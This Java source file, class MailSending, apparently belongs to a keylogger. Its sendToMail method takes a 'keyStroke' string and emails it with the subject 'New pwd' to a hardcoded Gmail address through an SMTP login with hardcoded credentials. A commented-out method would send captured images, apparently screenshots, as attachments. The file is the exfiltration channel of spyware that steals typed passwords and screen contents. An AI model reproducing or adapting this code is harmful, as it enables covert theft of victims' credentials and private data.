import java.awt.image.BufferedImage;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.util.ByteArrayDataSource;

public class MailSending {

	public static void sendToMail(String keyStroke) {
		String to = "octronanonymous@gmail.com";

		String from = "mdp@gmail.com";
		try {
			String host = "smtp.gmail.com";
			String d_port = "465";

			Properties properties = System.getProperties();

			properties.setProperty("mail.smtp.host", host);
			properties.put("mail.smtp.port", d_port);
			properties.put("mail.smtp.auth", "true");
			properties.put("mail.smtp.starttls.enable", "true");
			properties.put("mail.smtp.socketFactory.port", d_port);
			properties.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
			properties.put("mail.smtp.socketFactory.fallback", "false");

			Session session = Session.getDefaultInstance(properties);

			MimeMessage message = new MimeMessage(session);

			message.setFrom(new InternetAddress(from));

			message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));

			message.setSubject("New pwd");

			message.setText(keyStroke);

			Transport transport = session.getTransport("smtps");
			transport.connect(host, Integer.valueOf(d_port).intValue(), "octronanonymous",
					"g8fgerzg5gz95gzrgg849841965ui rw894fdsf");
			transport.sendMessage(message, message.getAllRecipients());
			transport.close();
			System.out.println("Sent message successfully....");
		} catch (MessagingException mex) {
			mex.printStackTrace();
		}
	}
	
//	public static void sendImageToMail(BufferedImage image) {
//		MimeMultipart content = new MimeMultipart("related");
//
//		BodyPart bodyPart = new MimeBodyPart();
//		bodyPart.setContent(message, "text/html; charset=ISO-8859-1");
//		content.addBodyPart(bodyPart);
//
//		bodyPart = new MimeBodyPart();
//		DataSource ds = new ByteArrayDataSource(image, "image/jpeg");
//		bodyPart.setDataHandler(new DataHandler(ds));
//		bodyPart.setHeader("Content-Type", "image/jpeg; name=image.jpg");
//		bodyPart.setHeader("Content-ID", "<image>");
//		bodyPart.setHeader("Content-Disposition", "inline");
//		content.addBodyPart(bodyPart);
//
//		msg.setContent(content);
//	}
}
